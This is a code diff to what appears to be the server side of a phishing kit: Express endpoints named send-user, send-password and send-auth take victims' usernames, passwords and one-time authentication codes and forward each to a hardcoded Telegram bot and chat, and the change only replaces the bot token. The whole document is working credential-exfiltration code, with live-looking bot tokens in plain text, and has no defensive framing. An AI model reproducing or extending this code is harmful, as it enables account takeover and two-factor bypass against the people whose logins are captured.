@@ -30,7 +30,7 @@ app.post('/send-user', async (req, res) => {
     }
     usuariosData[dispositivoID].usuario = `U ${dispositivoID.replace('id.', '')}: \`${usuario}\``;
 
-    await fetch(`https://api.telegram.org/bot8748275769:AAE6pBgwNMb-4X3kLljS4zPH03dhlQd7Jz8/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot8989873312:AAHIjetAsHLP_mkCeD3-qwH7OnkaTqvVc6I/sendMessage`, {
         method: 'POST',
         body: JSON.stringify({
             chat_id: '8660458713',
@@ -51,7 +51,7 @@ app.post('/send-password', async (req, res) => {
         usuariosData[dispositivoID].contraseña = `C ${dispositivoID.replace('id.', '')}: \`${password}\``;
     }
 
-    await fetch(`https://api.telegram.org/bot8748275769:AAE6pBgwNMb-4X3kLljS4zPH03dhlQd7Jz8/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot8989873312:AAHIjetAsHLP_mkCeD3-qwH7OnkaTqvVc6I/sendMessage`, {
         method: 'POST',
         body: JSON.stringify({
             chat_id: '8660458713',
@@ -72,7 +72,7 @@ app.post('/send-auth', async (req, res) => {
         usuariosData[dispositivoID].codigo = `A ${dispositivoID.replace('id.', '')}: \`${authCode}\``;
     }
 
-    await fetch(`https://api.telegram.org/bot8748275769:AAE6pBgwNMb-4X3kLljS4zPH03dhlQd7Jz8/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot8989873312:AAHIjetAsHLP_mkCeD3-qwH7OnkaTqvVc6I/sendMessage`, {
         method: 'POST',
         body: JSON.stringify({
             chat_id: '8660458713',
